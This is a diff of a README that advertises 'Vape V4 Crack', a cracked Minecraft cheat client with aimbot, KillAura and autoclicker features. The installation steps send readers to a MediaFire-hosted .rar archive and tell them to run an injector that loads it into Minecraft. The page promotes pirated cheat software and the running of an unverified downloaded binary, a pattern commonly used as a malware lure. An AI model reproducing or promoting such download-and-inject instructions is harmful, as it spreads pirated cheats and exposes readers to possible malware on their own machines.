@@ -1,4 +1,4 @@
-![Vape V4 Crack](https://imgur.com/a/GR2q5q0)  <!-- Загрузи баннер на imgur или в репозиторий и укажи ссылку -->
+![Vape V4 Crack]( https://imgur.com/a/GR2q5q0 ) 
 ## ✨ Features
 - 🎯 **AimAssist & KillAura** – автоматическая наводка и мгновенные удары  
 - ⚡ **Velocity & AutoClicker** – настройка отдачи и авто-кликер для PvP  
@@ -8,7 +8,7 @@
 ## 📥 Installation
 1. **Download** the cheat from [https://www.mediafire.com/file/cir7ldeviwn6eec/Vape+V4.rar/file](#) 
 2. **Extract** the archive  
-3. **Run the injector** and select the Vape V4 DLL  
+3. **Run the injector** and select the Vape V4   
 4. **Inject** into Minecraft  
 5. **Customize settings** and dominate!  
 ## ⚠️ Disclaimer
